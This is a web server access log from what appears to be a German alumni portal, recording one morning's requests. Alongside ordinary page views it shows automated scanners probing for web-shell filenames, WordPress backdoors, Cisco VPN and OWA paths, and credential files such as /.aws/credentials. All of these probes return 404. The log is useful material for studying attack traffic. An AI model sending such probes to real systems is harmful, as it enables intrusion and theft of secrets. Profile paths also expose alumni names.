d5b448449b4316021963519de5aaabd19cce17c83f591890a4411644a6cc032c;2025-11-13 08:08:05;;/;GET;200
a944d2e9fd04804b6228bbbe0ce51d0289e9a9e2f87bb8c6f21027bc55ad5417;2025-11-13 08:22:42;;/gruppen/hobby/teamsportarten;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-13 08:26:37;/personen/all/2;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
4070602e0632bad78649071643d729b22a112317434961005dfc8eaa82fcb046;2025-11-13 08:37:11;;/personen/alumni/schule/67210;GET;200
0209b07e7afbd19293ead62b6721643aff20b1dcb402462d2899724f69258338;2025-11-13 08:40:00;;/;GET;200
8e80cbd4248a929f38f67575f8726107a0e84a0e416d452ef6010e89dd5f6e97;2025-11-13 08:40:15;;/personen/alumni/details/jessica-schwarz;GET;200
c991efdb88be0258f086ab50cd03592e02a0f07efda2478b2606aeadf72327f2;2025-11-13 08:43:50;;/;GET;200
af8f6ce770b63f9a5c8dc0c0ff3d58f56698586f20de1db8f77b86d1c5f55f90;2025-11-13 08:51:10;;/gruppen/hobby/film-und-videoproduktion;GET;302
37024f146992ab9a8e333abcf43c9121ac0459910f63ce278dda962231e635ee;2025-11-13 08:58:06;;/;GET;200
8a05866609b86356332371e798c3d9a61867131f5c0f048cd9a6b07b290efda2;2025-11-13 08:59:34;/media/system/js/core.js;/media/system/js/core.js;GET;404
8a05866609b86356332371e798c3d9a61867131f5c0f048cd9a6b07b290efda2;2025-11-13 08:59:35;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
d1a037395fa7e788967aa009a3e2e503a6cbcd5cbaa351d7fa39eaf13f777d1e;2025-11-13 09:02:51;;/personen/alumni/details/sidney-dittrich;GET;200
648218f2eeaa0f3831c873cfb7492fbb418872c2c3204d7ef2e76326bf732c7a;2025-11-13 09:03:21;;/;GET;200
6fef9ff6143c5938b28ce287c4dc6e9488f6c62362f18082fe76f723ddf86f8c;2025-11-13 09:15:40;;/personen/alumni/schule/5501;GET;200
1b60b90089f7e91b413e2d5090d939af718f326e1e2eba83d89d5a6455990e02;2025-11-13 09:19:08;;/personen/alumni/details/olaf-schaeffer;GET;200
79559bf900c0a57b5d4c72cd32c5343f0791bb4c589e69abfa2baf92df2baf43;2025-11-13 09:25:51;/;/;GET;200
b8f065d6a1b988578014c5a42b1f2da902493bb32f6cc9c77ee6631a179e63a6;2025-11-13 09:28:12;;/personen/alumni/schule/5514;GET;200
3eb1f19f518510e978e29f896c8168be1e54ac90b190ab8275f1f4a5dd9e94d0;2025-11-13 09:28:22;;/owa/auth/x.js;GET;404
461e053d071a38d65a0e3c1049ff6cffbdd994915616bcc80792bbf762ae265a;2025-11-13 09:33:24;;/;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:29;;/imprint;GET;404
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:31;;/;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:33;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:33;;/themen/details/abschied-aus-moabit;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:34;;/personen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:34;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-13 09:40:34;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
ca80a7f4e4a86cc4780a12e1aea969c983766c3b851b674750dd5649a349eede;2025-11-13 09:40:36;;/personen/alumni/schule/4240016;GET;200
3f594231ac9ac14aca965dfb292bca02a19e8714f935ccb862b705dacaafd967;2025-11-13 09:48:26;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
b91a07f0a13d04a47951d341034c0c130e8bad5ef664a6dd6d6d528c0772c4d8;2025-11-13 09:54:57;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
85290f67fe86644f7d11f908d0346793cc493806c709b572d2f18651654e3e0e;2025-11-13 09:56:13;;/personen/alumni/schule/HS001;GET;200
75c73fa02f76c4e73515d89d4afd38eac9887f538459be69946eaff65ad5af21;2025-11-13 09:56:25;/;/;GET;200
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:01;;/aa.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:02;;/abcd.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:03;;/admin.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:04;;/buy.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:05;;/edit.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:05;;/file.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:06;;/flower.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:07;;/images/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:08;;/info.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:09;;/ioxi-o.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:09;;/nc4.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:10;;/xleet.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:11;;/wp-admin/includes/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:12;;/wp-content/upgrade/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:13;;/wp-content/uploads/admin.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:13;;/wp-good.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:14;;/wp-includes/Text/Diff/Renderer/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:15;;/wp-includes/style-engine/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:16;;/xmrlpc.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:17;;/about.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:17;;/adminfuns.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:18;;/alfa.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:19;;/asasx.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:20;;/autoload_classmap.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:20;;/classwithtostring.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:21;;/cong.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:22;;/file2.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:23;;/moon.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:24;;/wp-admin/css/colors/blue/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:24;;/wp-content/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:25;;/wp-content/plugins/yanierin/akcc.php;GET;404
6568b697b5e42586cf7cec385b532beb409cb2a3367a37e11b64c266c0b9f480;2025-11-13 09:59:25;;/;GET;200
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:26;;/wp-content/uploads/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:27;;/wp-content/wp-conflg.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:28;;/wp-cron.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:28;;/wp-includes/IXR/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:29;;/wp-includes/block-supports/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:30;;/wp-includes/fonts/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:31;;/wp-includes/fonts/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:32;;/wp-includes/js/crop/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:32;;/wp-includes/rest-api/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 09:59:33;;/wp-includes/widgets/;GET;404
d64d3e1af9f88b52290796432055d2a705be92c56ecaa1e2083800b2ce95aa9c;2025-11-13 10:01:18;;/;GET;200
d64d3e1af9f88b52290796432055d2a705be92c56ecaa1e2083800b2ce95aa9c;2025-11-13 10:07:18;;/webui/;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-13 10:10:45;/personen/all/5;/personen/alumni/details/sami-teuchert;GET;200
d6a38198e257296124ab112e58a395650cfa155f1a58c93833785f84729c83dd;2025-11-13 10:12:25;;/themen/details/abschied-aus-moabit;GET;200
38da64008548435ffce8cecb557ffd4b6dab38730e9e72a8cde28c47b0cab032;2025-11-13 10:12:36;;/;GET;200
ef24caa38be7eb22520a4c9bf46a8d4b628995d8d949ac7a3266ce3301a99d6f;2025-11-13 10:16:53;;/personen/alumni/details/benjamin-wagner;GET;200
d64d3e1af9f88b52290796432055d2a705be92c56ecaa1e2083800b2ce95aa9c;2025-11-13 10:25:42;;/geoserver/web/;GET;404
a4bdc9d5f6f6cb5b63370df61d0bec9016f69606c1e4104528663d10573f8bfe;2025-11-13 10:25:48;;/gruppen/hobby/diy-projekte;GET;302
0120ee4c81b0a6ddeb73994a0846221c5b2fbce1bcd00c4447676fded6a8b052;2025-11-13 10:30:15;/;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-13 10:31:26;;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-13 10:31:28;/;/;GET;200
7acfb2721f68679ae5b6bfaa4469fdf5a55ff34b5a1f099c056d05c171f7ce63;2025-11-13 10:38:11;;/personen/alumni/schule/HS002;GET;200
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:36;;/aa.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:37;;/abcd.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:38;;/admin.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:39;;/buy.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:40;;/edit.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:41;;/file.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:42;;/flower.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:43;;/images/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:43;;/info.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:44;;/ioxi-o.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:45;;/nc4.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:46;;/xleet.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:47;;/wp-admin/includes/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:47;;/wp-content/upgrade/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:48;;/wp-content/uploads/admin.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:49;;/wp-good.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:50;;/wp-includes/Text/Diff/Renderer/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:51;;/wp-includes/style-engine/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:52;;/xmrlpc.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:52;;/about.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:53;;/adminfuns.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:54;;/alfa.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:55;;/asasx.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:56;;/autoload_classmap.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:56;;/classwithtostring.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:57;;/cong.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:58;;/file2.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:43:59;;/moon.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:00;;/wp-admin/css/colors/blue/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:01;;/wp-content/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:01;;/wp-content/plugins/yanierin/akcc.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:02;;/wp-content/uploads/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:03;;/wp-content/wp-conflg.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:04;;/wp-cron.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:05;;/wp-includes/IXR/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:05;;/wp-includes/block-supports/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:06;;/wp-includes/fonts/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:07;;/wp-includes/fonts/index.php;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:08;;/wp-includes/js/crop/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:09;;/wp-includes/rest-api/;GET;404
e0b4b3f5a854e53b2cecbc93ac7f13636597d7d6f454052d95ef00f11bb3d3c3;2025-11-13 10:44:10;;/wp-includes/widgets/;GET;404
4d453acdbc340b15f414b92e4b6583be138b4cbb49abf15af6aac7e543b28ce1;2025-11-13 10:45:26;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
6670e1d15865906726e894e3e398631cfd0e4ebe53bcb7f88f74d64495490d87;2025-11-13 10:51:28;;/personen/alumni/schule/MP002;GET;200
6d90d6d23cf668bbe5d462daef7b02ea3f3e4efecb7e53b9f4dd878a17399a4c;2025-11-13 10:52:28;;/;GET;200
f6512131e2cf8bd5d658004fd8a645c4aca60dd2ff3b22cd9a9a28f09ed9e261;2025-11-13 11:05:35;;/rechtliches/datenschutz;GET;200
29723d355006596a16f47916513554b606714072a24335a807dc4319b98d0935;2025-11-13 11:08:26;;/xmlrpc.php;GET;404
d93a621ca9a8bf923b3f3b145938524cb7c49cab687b5d982e686a92cb769e57;2025-11-13 11:08:40;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-13 11:11:12;;/personen/alumni/schule/SL001;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-13 11:16:11;/;/;GET;200
54716ea857c4d0797dd52293a25964df0b49561a1dd5e4a590b625f26aec3160;2025-11-13 11:18:15;;/rechtliches/green-data;GET;200
3da4b6e1a75dde7901630f997ec0e44ab015d31275c5e282311ef15471891241;2025-11-13 11:24:22;;/;GET;200
43314b4331596d45476bd81221ff0de6f60d27c24c1eec9da3152ebc0ac98fe2;2025-11-13 11:27:50;;/+CSCOL+/Java.jar;GET;404
43314b4331596d45476bd81221ff0de6f60d27c24c1eec9da3152ebc0ac98fe2;2025-11-13 11:27:51;;/+CSCOE+/logon_forms.js;GET;404
43314b4331596d45476bd81221ff0de6f60d27c24c1eec9da3152ebc0ac98fe2;2025-11-13 11:27:52;;/+CSCOL+/a1.jar;GET;404
43314b4331596d45476bd81221ff0de6f60d27c24c1eec9da3152ebc0ac98fe2;2025-11-13 11:27:54;;/+CSCOE+/transfer.js;GET;404
2472e45a452813a53f731a189a67a6b7bf516132e09d2ca0c993419f2507997e;2025-11-13 11:30:16;;/;GET;200
6670e1d15865906726e894e3e398631cfd0e4ebe53bcb7f88f74d64495490d87;2025-11-13 11:31:16;;/personen/alumni/schule/68470;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-13 11:41:12;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-13 11:41:25;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-13 11:41:26;;/;GET;200
9977f8b2573e4e162393a96112bbe27869a0ad0a1b7db7d20881aac22b66f0a7;2025-11-13 11:44:29;;/rechtliches/impressum;GET;200
32fb943b4ba5101e0dcb9e52062f8c43e622b20106d4975749b5692de72e798a;2025-11-13 11:46:22;;/;GET;200
d3553b26743122de7b3eb2c98ff88ab6048cf8808cd34613052781c7441b8fdd;2025-11-13 11:46:35;;/gruppen/hobby/debattieren;GET;302
fef43d4425a6753354b55af47c372704bb6f2fdc806814745c395c29d8e344b7;2025-11-13 11:49:58;;/gruppen/interesse/recht-und-verwaltung;GET;200
214a0e0ad6cba785fb7b3e617073f0d5ed0150fe331b1a37bccada031fbec86a;2025-11-13 11:56:23;;/gruppen/hobby/chor;GET;302
ab4c4a7d2d44cef82ce059e16fe7461fb2d46ce24e330fd08023660d94d29d62;2025-11-13 11:56:25;;/gruppen;GET;200
fd4f83800bc910a053eebcf4966c47261b22ec225a3eb7e4d227b3c8d1690898;2025-11-13 12:02:07;;/gruppen/hobby/mathematik-wettbewerbe;GET;302
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-13 12:12:25;;/;GET;200
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-13 12:12:26;;/docker-compose.prod.yml;GET;404
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-13 12:12:26;;/.aws/credentials;GET;404
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-13 12:12:27;;/config.json;GET;404
efacc50b1322a641931919c28cc165d902fc417cc58b53b6c0b570c717e2072b;2025-11-13 12:16:06;;/personen/alumni/schule/59043;GET;200
9ee9a0c63a82fbb5eeefa508fed67b79b72b38dbdabdc4159a2757e7c4b1d778;2025-11-13 12:21:09;;/;GET;200
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:39;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:40;;/shoha.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:41;;/ze.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:41;;/xo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:42;;/wp-the1me.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:43;;/m.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:43;;/e.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:44;;/dd1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:44;;/conn.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:45;;/card.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:45;;/asas.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:46;;/kki.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:47;;/js.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:47;;/view.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:48;;/wso.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:48;;/sid3.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:49;;/mans.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:49;;/111.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:50;;/403.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:51;;/4yps5d.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:51;;/fs6.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:52;;/lv.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:52;;/habhan.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:53;;/akcc.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:53;;/bi1f.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:54;;/lib.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:55;;/luxe.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:56;;/wsd.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:57;;/404.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:58;;/an7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:59;;/fs7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:24:59;;/new4.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:00;;/icon.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:01;;/blox.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:02;;/gm.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:03;;/iko.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:03;;/miso.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:04;;/moie.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:05;;/shelp.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:06;;/siln.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:07;;/sko.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-13 12:25:08;;/3.php;GET;404
